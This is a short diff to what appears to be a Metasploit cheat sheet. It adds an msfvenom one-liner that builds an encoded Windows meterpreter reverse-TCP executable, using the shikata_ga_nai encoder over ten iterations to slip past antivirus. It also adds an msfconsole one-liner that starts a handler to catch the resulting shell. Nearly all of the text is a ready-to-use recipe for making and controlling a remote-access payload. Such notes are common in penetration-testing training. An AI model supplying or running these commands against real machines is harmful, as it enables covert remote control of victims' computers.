@@ -18,3 +18,9 @@ set <option> <value>
 
 # To run the exploit
 exploit
+
+# One liner to create/generate a payload for windows
+msfvenom --arch x86 --platform windows --payload windows/meterpreter/reverse_tcp LHOST=<listening_host> LPORT=<listening_port> --bad-chars “\x00” --encoder x86/shikata_ga_nai --iterations 10 --format exe --out /path/
+
+# One liner start meterpreter
+msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST <listening_host>;set LPORT <listening_port>;run;"
